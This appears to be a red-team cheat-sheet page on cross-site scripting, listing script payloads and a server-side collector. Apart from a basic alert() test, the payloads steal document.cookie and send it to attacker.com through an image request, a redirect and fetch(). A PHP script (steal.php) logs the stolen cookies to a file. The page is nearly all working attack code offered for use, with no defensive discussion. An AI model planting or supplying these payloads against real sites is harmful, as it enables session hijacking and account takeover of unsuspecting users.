---
title: XSS
parent: Web Attack
grand_parent: Red Team
---

<details markdown="1">
<summary>XSS</summary>

#### Basic Syntax

```xml
<script>alert(‘XSS’);</script>
```

## Image File Format

```xml
<script>
new Image().src = ‘http://attacker.com/steal?c=’ + document.cookie;
</script>
```

## Sending with Parameters

```xml
<script>
location.href=‘http://attacker.com/log?cookie=’+document.cookie
</script>
```

```xml
<script>
fetch(‘http://attacker.com/log?cookie=’ + encodeURIComponent(document.cookie));
</script>
```

## The server-side processing (`steal.php`) that allows the attacker to receive the cookie is as follows
```php
<?php 
file_put_contents(‘cookies.txt’, $_GET[‘c’] . “\n”, FILE_APPEND); 
?>
```

</details>